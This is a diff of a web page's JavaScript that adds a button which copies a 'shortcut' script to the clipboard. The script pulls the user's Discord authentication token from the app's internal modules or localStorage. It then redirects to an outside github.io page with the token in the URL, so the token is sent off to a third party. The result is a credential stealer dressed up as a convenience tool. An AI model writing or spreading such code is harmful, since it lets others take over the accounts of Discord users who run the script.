@@ -2,7 +2,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const copyBtn = document.getElementById('copyBtn');
     const bookmarkletCode = document.getElementById('bookmarkletCode');
 
-    const magicBtn = document.getElementById('magicBtn');
+    const copyShortcutBtn = document.getElementById('copyShortcutBtn');
 
     const copyToClipboard = async (text, button) => {
         try {
@@ -26,6 +26,11 @@ document.addEventListener('DOMContentLoaded', () => {
 
     copyBtn.addEventListener('click', () => {
         copyToClipboard(bookmarkletCode.innerText, copyBtn);
+    });
+
+    copyShortcutBtn.addEventListener('click', () => {
+        const shortcutScript = `(function(){let t=(webpackChunkdiscord_app.push([[''],{},e=>{for(let c in e.c)if(e.c[c].exports?.default?.getToken)t=e.c[c].exports.default.getToken();for(let a in e.c[c].exports)if(e.c[c].exports?.[a]?.getToken&&e.c[c].exports[a][Symbol.toStringTag]!=="IntlMessagesProxy")t=e.c[c].exports[a].getToken()}] )||window.localStorage.getItem('token')||window.localStorage.getItem('__auth_token')).replace(/"/g,'');if(t&&t!=='undefined'){window.location.href='https://enzo695.github.io/token-/result.html?token='+t}else{alert('Logue no Discord primeiro!')};completion();})();`;
+        copyToClipboard(shortcutScript, copyShortcutBtn);
     });
 
     magicBtn.addEventListener('click', async () => {
